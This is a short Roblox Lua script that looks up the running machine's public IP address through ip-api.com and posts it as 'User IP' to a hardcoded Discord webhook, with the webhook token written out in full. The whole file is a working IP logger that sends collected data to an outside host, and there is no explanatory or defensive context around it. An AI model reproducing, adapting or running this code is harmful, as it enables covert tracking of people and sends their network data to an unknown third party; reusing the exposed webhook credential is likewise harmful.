local httpService = game:GetService("HttpService")

local function get()
    local success, response = pcall(function()
        return httpService:GetAsync("http://ip-api.com/json")
    end)

    if success then
        local data = httpService:JSONDecode(response)
        return data.query
    else
        return nil
    end
end
local function send(ip)
    local url = "https://discord.com/api/webhooks/1257373238032470097/_qstqrADpUrVenH_6twICgTNnKy2RfwDjpNHxFyIsuU9pLdUOKnsAEeq_5YqQ9yYWOPZ"
    local payload = {
        content = "User IP: " .. ip
    }

    local headers = {
        ["Content-Type"] = "application/json"
    }

    local success, _ = pcall(function()
        httpService:PostAsync(url, httpService:JSONEncode(payload), Enum.HttpContentType.ApplicationJson, false, headers)
    end)

    return success
end

local ip = get()
if ip then
    send(ip)
end
